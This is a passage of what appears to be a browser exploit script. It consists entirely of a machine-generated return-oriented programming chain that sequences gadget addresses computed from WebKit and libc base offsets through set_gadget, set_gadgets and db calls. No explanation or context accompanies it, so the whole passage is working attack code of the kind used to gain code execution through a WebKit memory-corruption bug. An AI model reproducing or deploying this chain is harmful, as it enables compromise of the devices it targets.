webkit_base+6227286, 
libc_base+793877, 
ropchain+342056, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+342040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+342240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+342224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+342360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342408, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+342392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+342520, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+342512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+342536, 
ropchain+342976, 
libc_base+50775, 
libc_base+793877, 
ropchain+342576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+342728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+342712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+342840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342856, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+342968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342952, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+50775, 
libc_base+793877, 
ropchain+343040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+343120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+343176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+343272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+343360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+343376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+343528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+343560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+343512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+343544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+343720, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+343688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+343672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+343792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+343808, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+343896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+343952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+344072, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+344256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+344240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+344480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965152, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965152, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+344640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+344808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+344792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+344944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965148, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+345032, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+345232, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+345368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+345384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+345352, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+345480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+345464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+345576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+345656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+345712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+345808, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+345896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+345912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+346064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+346096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+346048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346080, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+346256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+346224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+346208, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+346328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+346344, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+346432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+346560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+346720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+346808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+346936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+347048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([3116, 0]); 
set_gadget(libc_base+788575,); 
db([3116, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+347200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+347216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+347184, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([322371584, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+347400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965152, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+347488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+347504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+347656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+347688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+347640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+347672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+347784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+347768, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+347880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965164, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+347992, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+255640, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+348128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+348144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+348264, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+348248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+348392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+348560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+348592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+348544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+348688, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+348672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398032, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+348840, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+348928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+349016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+349032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+349184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+349168, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+349200, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349384, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+349480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+349816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+349800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349984, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349968, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+350096, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+350088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+350112, 
ropchain+350552, 
libc_base+50775, 
libc_base+793877, 
ropchain+350152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+350304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+350288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350432, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350528, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+793877, 
ropchain+350608, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+350744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+350840, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+350928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+350944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+351096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+351288, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+351256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+351360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351376, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+351464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+351520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+351640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+351824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
